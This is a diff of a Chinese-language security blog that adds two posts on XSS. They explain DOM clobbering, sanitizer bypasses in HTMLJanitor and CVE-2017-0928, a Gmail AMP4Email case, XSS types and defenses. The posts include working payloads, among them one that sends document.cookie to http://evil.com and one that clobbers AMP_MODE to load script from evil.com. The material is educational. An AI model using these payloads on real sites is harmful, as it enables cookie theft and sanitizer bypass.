+<li><code>z</code> 是 <code>output</code>，最后访问其 <code>value</code> 属性触发 XSS</li>
+</ul>
+<hr>
+<h4 id="4-绕过属性白名单（HTML过滤器）"><a href="#4-绕过属性白名单（HTML过滤器）" class="headerlink" title="4. 绕过属性白名单（HTML过滤器）"></a>4. 绕过属性白名单（HTML过滤器）</h4><p>一些 HTML 过滤器（如 HTMLJanitor）会遍历 DOM 节点的属性：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; node.<span class="property">attributes</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">  <span class="comment">// 检查属性是否合法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果我们构造了这样的结构：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;x&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">name</span>=<span class="string">&quot;attributes&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>node.attributes</code> 被 <code>&lt;img&gt;</code> 元素覆盖，导致 <code>node.attributes.length</code> 返回 <code>undefined</code>，跳出循环，<strong>绕过所有属性检查</strong>！</p>
+<hr>
+<h4 id="5-toString-类型转换绕过"><a href="#5-toString-类型转换绕过" class="headerlink" title="5. toString 类型转换绕过"></a>5. <code>toString</code> 类型转换绕过</h4><p>某些 HTML 元素（如 <code>&lt;a&gt;</code>, <code>&lt;area&gt;</code>）的 <code>toString()</code> 方法返回 <code>href</code>，可被用于绕过类型检查。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;x&quot;</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> user = x;           <span class="comment">// user 是一个 HTMLAnchorElement</span></span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">alert</span>(user);            <span class="comment">// 调用 toString() → 执行 href</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="6-多级-iframe-层级访问"><a href="#6-多级-iframe-层级访问" class="headerlink" title="6. 多级 iframe 层级访问"></a>6. 多级 iframe 层级访问</h4><p>利用 iframe + <code>srcdoc</code> 构造深层次 DOM 结构：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;a&quot;</span> <span class="attr">srcdoc</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">  &lt;iframe name=&#x27;b&#x27; srcdoc=&#x27;&lt;a id=c name=d href=javascript:alert(1)&gt;test&lt;/a&gt;&#x27;&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> <span class="title function_">alert</span>(a.<span class="property">b</span>.<span class="property">c</span>.<span class="property">d</span>), <span class="number">500</span>);  <span class="comment">// 延迟访问嵌套 DOM 属性</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="7-HTML-标签之间的“层级引用”关系"><a href="#7-HTML-标签之间的“层级引用”关系" class="headerlink" title="7. HTML 标签之间的“层级引用”关系"></a>7. HTML 标签之间的“层级引用”关系</h4><p>有些标签天然具有父子结构的属性关系：</p>
+<ul>
+<li><code>form</code> → <code>input</code></li>
+<li><code>form</code> → <code>select</code></li>
+<li><code>form</code> → <code>img</code></li>
+</ul>
+<p>所以你可以构造：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;x&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;attributes&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">console</span>.<span class="title function_">log</span>(x.<span class="property">attributes</span>); <span class="comment">// 被 input#attributes clobber 掉</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="三、真实攻击案例分析"><a href="#三、真实攻击案例分析" class="headerlink" title="三、真实攻击案例分析"></a>三、真实攻击案例分析</h3><h4 id="案例-1：PortSwigger-实验室（DOMPurify-Bypass）"><a href="#案例-1：PortSwigger-实验室（DOMPurify-Bypass）" class="headerlink" title="案例 1：PortSwigger 实验室（DOMPurify Bypass）"></a>案例 1：PortSwigger 实验室（DOMPurify Bypass）</h4><ul>
+<li><p><strong>目标代码</strong>：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> defaultAvatar = <span class="variable language_">window</span>.<span class="property">defaultAvatar</span> || &#123; <span class="attr">avatar</span>: <span class="string">&#x27;/default.svg&#x27;</span> &#125;;</span><br><span class="line"><span class="keyword">let</span> avatarImgHTML = <span class="string">&#x27;&lt;img src=&quot;&#x27;</span> + (comment.<span class="property">avatar</span> ? <span class="built_in">escape</span>(comment.<span class="property">avatar</span>) : defaultAvatar.<span class="property">avatar</span>) + <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>攻击目标</strong>：伪造 <code>defaultAvatar.avatar</code> 为恶意图片地址，触发 <code>onerror=alert(1)</code>。</p>
+</li>
+<li><p><strong>Payload 注入</strong>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;defaultAvatar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;defaultAvatar&quot;</span> <span class="attr">name</span>=<span class="string">&quot;avatar&quot;</span> <span class="attr">href</span>=<span class="string">&quot;1:<span class="symbol">&amp;quot;</span>onerror=alert(1)//&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>效果</strong>：<code>defaultAvatar.avatar</code> &#x3D; <code>&quot;1:\&quot;onerror=alert(1)//&quot;</code>，最终生成恶意 <code>&lt;img&gt;</code>。</p>
+</li>
+<li><p><strong>注意点</strong>：</p>
+<ul>
+<li>需 HTML 实体编码 <code>&quot; → &quot;</code></li>
+<li>URL 编码会导致 <code>net::ERR_FILE_NOT_FOUND</code> 报错</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h4 id="案例-2：HTMLJanitor-DOM-Clobbering-绕过白名单"><a href="#案例-2：HTMLJanitor-DOM-Clobbering-绕过白名单" class="headerlink" title="案例 2：HTMLJanitor DOM Clobbering 绕过白名单"></a>案例 2：HTMLJanitor DOM Clobbering 绕过白名单</h4><ul>
+<li><p><strong>目标过滤器</strong>：HTMLJanitor（白名单过滤器）</p>
+<ul>
+<li>仅允许如 <code>&lt;form&gt;</code>, <code>&lt;input&gt;</code> 等有限标签</li>
+<li>属性检查基于 <code>node.attributes.length</code></li>
+</ul>
+</li>
+<li><p><strong>构造方式</strong>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;x&quot;</span> <span class="attr">tabindex</span>=<span class="string">&quot;0&quot;</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(document.cookie)&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;attributes&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>绕过原理</strong>：</p>
+<ul>
+<li><code>&lt;input id=&quot;attributes&quot;&gt;</code> 覆盖了 <code>node.attributes</code></li>
+<li>导致属性检查函数跳过，保留了 <code>onfocus</code></li>
+</ul>
+</li>
+<li><p><strong>触发方法</strong>：</p>
+<ul>
+<li>使用 <code>iframe.onload + setTimeout</code> 等待页面加载评论后自动触发</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;https://lab-url/post?postId=3&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;setTimeout(()=&gt;this.src += &#x27;#x&#x27;, 500)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<h4 id="CVE-2017-0928：绕过-sanitized-标记位"><a href="#CVE-2017-0928：绕过-sanitized-标记位" class="headerlink" title="CVE-2017-0928：绕过 _sanitized 标记位"></a>CVE-2017-0928：绕过 <code>_sanitized</code> 标记位</h4><ul>
+<li><p><strong>漏洞组件</strong>：<code>html-janitor v2.0.2</code></p>
+</li>
+<li><p><strong>问题代码</strong>：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (node.<span class="property">_sanitized</span>) <span class="keyword">continue</span>;</span><br><span class="line">...</span><br><span class="line">node.<span class="property">_sanitized</span> = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>攻击方式</strong>：</p>
+<ul>
+<li>创建 <code>&lt;object name=&quot;_sanitized&quot; onmouseover=alert(1)&gt;</code> 覆盖标志位属性</li>
+<li>使得过滤器误判节点已处理 → 未进入 sanitize 流程</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h4 id="Google-GMail-AMP4Email-DOM-Clobbering-套路"><a href="#Google-GMail-AMP4Email-DOM-Clobbering-套路" class="headerlink" title="Google GMail AMP4Email DOM Clobbering 套路"></a>Google GMail AMP4Email DOM Clobbering 套路</h4><ul>
+<li><p><strong>代码逻辑简化版</strong>：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable constant_">AMP_MODE</span>.<span class="property">localDev</span>) &#123;</span><br><span class="line">  loc = <span class="variable language_">window</span>.<span class="property">testLocation</span>.<span class="property">protocol</span> + <span class="string">&quot;//&quot;</span> + <span class="variable language_">window</span>.<span class="property">testLocation</span>.<span class="property">host</span> + <span class="string">&quot;/dist&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  loc = <span class="string">&quot;https://cdn.ampproject.org&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">script.<span class="property">src</span> = loc + <span class="string">&quot;/rtv/&quot;</span> + <span class="variable constant_">AMP_MODE</span>.<span class="property">rtvVersion</span> + <span class="string">&quot;/v0/xxx.js&quot;</span>;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>攻击构造</strong>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;AMP_MODE&quot;</span> <span class="attr">name</span>=<span class="string">&quot;localDev&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;AMP_MODE&quot;</span> <span class="attr">name</span>=<span class="string">&quot;test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;testLocation&quot;</span> <span class="attr">name</span>=<span class="string">&quot;protocol&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://evil.com#&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>效果</strong>：通过 DOM Clobbering 劫持 <code>AMP_MODE.localDev</code>, <code>window.testLocation.protocol</code>，最终控制 JS 文件加载地址。</p>
+</li>
+<li><p><strong>限制</strong>：CSP 限制了加载来源，但仍被 Google 认定为严重漏洞。</p>
+</li>
+</ul>
+<hr>
+<h3 id="四、防御策略总结"><a href="#四、防御策略总结" class="headerlink" title="四、防御策略总结"></a>四、防御策略总结</h3><h4 id="1-不使用隐式-DOM-映射变量"><a href="#1-不使用隐式-DOM-映射变量" class="headerlink" title="1. 不使用隐式 DOM 映射变量"></a>1. 不使用隐式 DOM 映射变量</h4><ul>
+<li><p>避免通过 <code>document.x</code> 或 <code>window.y</code> 访问变量</p>
+</li>
+<li><p>总是通过标准 API 获取元素：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;foo&#x27;</span>)</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;[name=&quot;bar&quot;]&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="2-类型判断"><a href="#2-类型判断" class="headerlink" title="2. 类型判断"></a>2. 类型判断</h4><ul>
+<li><p>检查变量类型，确保其不是恶意 HTMLElement</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(obj.<span class="property">attributes</span> <span class="keyword">instanceof</span> <span class="title class_">NamedNodeMap</span>)) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Clobbering detected!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="3-使用可信的-HTML-清洗器"><a href="#3-使用可信的-HTML-清洗器" class="headerlink" title="3. 使用可信的 HTML 清洗器"></a>3. 使用可信的 HTML 清洗器</h4><ul>
+<li><p>推荐使用 DOMPurify，默认防护 DOM Clobbering</p>
+</li>
+<li><p>启用如下选项：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(dirtyHTML, &#123;<span class="attr">SAFE_FOR_JQUERY</span>: <span class="literal">true</span>, <span class="attr">WHOLE_DOCUMENT</span>: <span class="literal">false</span>&#125;)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="4-启用-CSP-策略"><a href="#4-启用-CSP-策略" class="headerlink" title="4. 启用 CSP 策略"></a>4. 启用 CSP 策略</h4><ul>
+<li><p>防止加载非预期脚本：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27;; script-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="5-避免在-JavaScript-中拼接-HTML"><a href="#5-避免在-JavaScript-中拼接-HTML" class="headerlink" title="5. 避免在 JavaScript 中拼接 HTML"></a>5. 避免在 JavaScript 中拼接 HTML</h4><ul>
+<li><p>不要使用 <code>.innerHTML</code> 渲染动态内容</p>
+</li>
+<li><p>推荐使用：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">img.<span class="property">src</span> = userAvatar;</span><br><span class="line">div.<span class="title function_">appendChild</span>(img);</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/07/19/xss2/" data-id="cmda5jfke00013cc26punck3w" data-title="xss2" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-xss1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/07/19/xss1/" class="article-date">
+  <time class="dt-published" datetime="2025-07-19T11:07:30.000Z" itemprop="datePublished">2025-07-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/07/19/xss1/">xss1</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="XSS-漏洞分类详解"><a href="#XSS-漏洞分类详解" class="headerlink" title="XSS 漏洞分类详解"></a>XSS 漏洞分类详解</h2><h3 id="什么是-XSS（跨站脚本攻击）"><a href="#什么是-XSS（跨站脚本攻击）" class="headerlink" title="什么是 XSS（跨站脚本攻击）"></a>什么是 XSS（跨站脚本攻击）</h3><p>XSS（Cross-Site Scripting）是一种将恶意脚本注入网页的攻击方式，通常利用受信任网站在输出内容时未对用户输入进行正确过滤，最终导致攻击者代码在受害者浏览器中执行。</p>
+<h3 id="常见-XSS-分类"><a href="#常见-XSS-分类" class="headerlink" title="常见 XSS 分类"></a>常见 XSS 分类</h3><h4 id="1-反射型-XSS（Reflected-XSS）"><a href="#1-反射型-XSS（Reflected-XSS）" class="headerlink" title="1. 反射型 XSS（Reflected XSS）"></a>1. 反射型 XSS（Reflected XSS）</h4><ul>
+<li><p><strong>原理</strong>：恶意脚本来自当前请求，服务器将用户输入直接反射到页面中。</p>
+</li>
+<li><p><strong>特点</strong>：</p>
+<ul>
+<li>不被存储在数据库中</li>
+<li>常见于 URL 参数、表单提交等</li>
+</ul>
+</li>
+<li><p><strong>示例</strong>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">html</span><br><span class="line">https://example.com/search?q=<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="2-存储型-XSS（Stored-XSS）"><a href="#2-存储型-XSS（Stored-XSS）" class="headerlink" title="2. 存储型 XSS（Stored XSS）"></a>2. 存储型 XSS（Stored XSS）</h4><ul>
+<li><p><strong>原理</strong>：攻击者提交的恶意脚本被“存储”在服务器端（如数据库），之后会被其他用户访问并执行。</p>
+</li>
+<li><p><strong>特点</strong>：</p>
+<ul>
+<li>危害最大，可影响多个用户</li>
+<li>常见于论坛、评论系统、用户资料页</li>
+</ul>
+</li>
+<li><p><strong>示例</strong>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;http://evil.com/steal?cookie=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="3-DOM-型-XSS（DOM-based-XSS）"><a href="#3-DOM-型-XSS（DOM-based-XSS）" class="headerlink" title="3. DOM 型 XSS（DOM-based XSS）"></a>3. DOM 型 XSS（DOM-based XSS）</h4><ul>
+<li><p><strong>原理</strong>：漏洞存在于前端 JavaScript 中，由 JavaScript 根据 URL 或页面内容动态构造 HTML，未进行安全处理。</p>
+</li>
+<li><p><strong>特点</strong>：</p>
+<ul>
+<li>不依赖服务器返回内容，完全发生在客户端</li>
+<li>DOM API 操作不当是主要原因</li>
+</ul>
+</li>
+<li><p><strong>示例</strong>：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">location.<span class="property">hash</span> = <span class="string">&quot;#x=&lt;img src=1 onerror=alert(1)&gt;&quot;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;content&#x27;</span>).<span class="property">innerHTML</span> = location.<span class="property">hash</span>.<span class="title function_">substring</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="XSS-防御通用策略"><a href="#XSS-防御通用策略" class="headerlink" title="XSS 防御通用策略"></a>XSS 防御通用策略</h3><ul>
+<li>所有输入必须<strong>验证、过滤、编码</strong></li>
+<li>输出前使用 HTML、JavaScript 编码</li>
+<li>使用 CSP、HttpOnly Cookie</li>
+<li>使用 DOMPurify 等前端清洗库</li>
+<li>后端模板采用自动转义机制</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/07/19/xss1/" data-id="cmda5jfkc00003cc2amgz0eqf" data-title="xss1" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-zuoye" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/07/13/zuoye/" class="article-date">
@@ -225,6 +628,18 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2025/07/19/xss3/">xss3</a>
+          </li>
+        
+          <li>
+            <a href="/2025/07/19/xss2/">xss2</a>
+          </li>
+        
+          <li>
+            <a href="/2025/07/19/xss1/">xss1</a>
+          </li>
         
           <li>
             <a href="/2025/07/13/zuoye/">zuoye</a>
